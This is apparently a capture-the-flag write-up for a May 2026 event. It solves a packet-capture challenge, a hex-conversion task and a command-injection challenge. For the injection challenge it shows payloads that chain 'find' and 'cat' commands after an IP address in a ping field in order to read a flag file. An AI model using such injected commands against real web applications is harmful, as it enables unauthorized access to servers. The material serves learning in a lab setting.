# Pwn2Play Open CTF
Sat, 30 May 2026, 09:00 UTC — Sat, 30 May 2026, 18:00 UTC

**Links**
- CTFtime: <https://ctftime.org/event/3220>
- Official URL: <https://pwn2play.biterra.co/>


# My facilities
<img width="1569" height="634" alt="2026-05-25-18:33:49" src="https://github.com/user-attachments/assets/9de40e24-b8a7-4a02-91ec-ea55741268d8" />


# Challenge page

<img width="2431" height="1326" alt="2026-05-30-11:02:42" src="https://github.com/user-attachments/assets/c84501b1-2028-4629-9131-2a036af18261" />


# The Hello Packet
**Objective**
- A suspicious device on the network sent a single "Heartbeat" packet. We captured it in a file named heartbeat.pcap. Find the hidden message inside the packet's payload to get the flag.


We download the pcap and open it up using Wireshark, there's a single UDP packet waiting for us with the secret data:

<img width="1603" height="681" alt="2026-05-30-11:17:12" src="https://github.com/user-attachments/assets/d9149810-c6e1-42d4-9489-391e330e4a55" />

<img width="656" height="256" alt="2026-05-30-11:19:48" src="https://github.com/user-attachments/assets/48d5afb1-6b33-4641-b87a-a50669a0d871" />


-------------------

# Hex Checkpoint
**Objective**
- Convert the ASCII string "Hi" into lowercase hexadecimal and submit the bytes with no spaces.

This one was pretty simple:
```bash
❯❯ echo -n "Hi" | xxd                   
00000000: 4869                                     Hi
```
The -n flag omits newlines!

<img width="667" height="255" alt="2026-05-30-11:37:52" src="https://github.com/user-attachments/assets/c31004ec-51f2-48b9-8d66-c6a55d19a06c" />



# Ping Of The Hill
**Objective**
- This web app generously allows you to ping random targets, because what could possibly go wrong? Use an exploit to extract the contents of flag.txt hosted on the local disk.


<img width="1350" height="793" alt="2026-05-30-13:47:58" src="https://github.com/user-attachments/assets/a4919a4c-98e3-42c9-a51e-712b66b84fb1" />

We simply chain a command after the IP address. I started of with some basics like `pwd` and `ls`. And eventually found the flag:
```bash
1.1.1.1 ; find / -type f -name flag.txt
1.1.1.1 ; cat /tmp/flag.txt
```
<img width="1257" height="782" alt="2026-05-30-14:01:57" src="https://github.com/user-attachments/assets/27854823-ab26-49a8-a4cd-c26a38553b49" />


-----------------








